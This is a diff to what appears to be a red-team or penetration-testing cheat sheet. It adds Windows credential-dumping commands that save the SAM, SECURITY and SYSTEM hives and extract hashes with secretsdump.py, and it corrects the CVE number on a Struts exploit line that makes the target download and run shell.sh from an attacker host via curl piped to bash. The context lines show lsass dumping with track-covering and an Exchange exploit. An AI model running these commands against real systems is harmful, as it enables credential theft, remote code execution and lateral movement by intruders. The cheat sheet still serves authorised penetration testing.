@@ -321,6 +321,12 @@
 	invoke_file /tmp/Invoke-PowerDump.ps1
 	Invoke-PowerDump
 	
+	# lsa secrets via hives
+	C:\> reg.exe save hklm\sam c:\temp\sam.save
+	C:\> reg.exe save hklm\security c:\temp\security.save
+	C:\> reg.exe save hklm\system c:\temp\system.save
+	python secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
+	
 	# looting lsass via minidumps, cover tracks
 	invoke_file /tmp/Out-Minidump.ps1
 	Get-Process lsass| Out-Minidump -DumpFilePath C:\temp
@@ -508,7 +514,7 @@
 ###### 11.) Lateral movement via exploitation.
 ```txt
 	# struts 2-59 exploit 
-	proxychains struts_cve-2020-0230.py -target http://<SERVER>/index.action -command 'curl --insecure -sv https://<IP>/shell.sh|bash -'
+	proxychains struts_cve-2019-0230.py -target http://<SERVER>/index.action -command 'curl --insecure -sv https://<IP>/shell.sh|bash -'
 
 	# exchange exploit
 	proxychains exchange_scanner_cve-2020-0688.py -s <SERVER> -u <USER> -p <PASSWORD> 
